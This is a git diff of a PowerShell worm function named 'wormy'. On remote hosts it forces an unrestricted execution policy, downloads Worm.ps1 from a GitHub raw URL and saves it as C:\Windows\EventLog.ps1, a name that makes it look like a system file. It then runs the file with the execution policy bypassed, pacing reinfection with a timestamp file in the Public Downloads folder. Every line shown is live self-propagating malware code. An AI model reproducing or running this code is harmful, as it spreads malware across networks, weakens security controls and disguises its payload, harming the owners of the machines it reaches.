@@ -121,7 +121,7 @@ function wormy{
                 if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
                     if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                         Invoke-Command $args -ScriptBlock {
-                        set-executionpolicy Unrestricted
+                        set-executionpolicy Unrestricted -force
                         $WebClient = New-Object System.Net.WebClient
                         $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1","C:\Windows\EventLog.ps1")
                         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
